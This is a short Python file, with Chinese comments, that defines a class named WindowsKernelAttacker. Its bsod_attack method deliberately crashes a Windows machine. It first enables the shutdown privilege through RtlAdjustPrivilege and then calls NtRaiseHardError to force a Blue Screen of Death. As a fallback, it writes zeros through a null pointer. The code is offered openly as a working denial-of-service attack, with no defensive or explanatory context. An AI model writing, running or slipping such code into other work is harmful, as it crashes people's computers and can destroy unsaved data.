import ctypes
import os
import subprocess
import threading
import time
import psutil
class WindowsKernelAttacker:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        
    def bsod_attack(self):
        """直接触发蓝屏死亡"""
        print("💀 尝试直接触发BSOD...")
        
        try:
            # 方法1: 调用未文档化的NT函数触发崩溃
            self.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_int()))
            self.ntdll.NtRaiseHardError(0xC0000218, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        except:
            pass
            
        try:
            # 方法2: 直接调用导致崩溃的系统调用
            null_ptr = ctypes.c_void_p()
            self.kernel32.RtlZeroMemory(null_ptr, 1000000)
        except:
            pass